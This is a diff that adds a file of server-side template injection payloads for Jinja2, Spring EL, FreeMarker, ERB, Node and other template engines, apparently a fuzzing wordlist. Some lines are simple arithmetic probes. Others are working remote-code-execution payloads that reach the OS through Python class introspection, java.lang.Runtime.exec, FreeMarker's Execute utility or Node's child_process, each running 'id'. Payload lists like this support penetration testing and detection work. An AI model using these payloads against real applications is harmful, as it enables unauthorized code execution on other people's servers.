@@ -1,0 +1,22 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{7*7}
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{self.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__base__.__subclasses__()}}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+{{=7*7}}
+{{:"pwned"}}
+@(1+2)
+@{var x = 1;}
+{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}
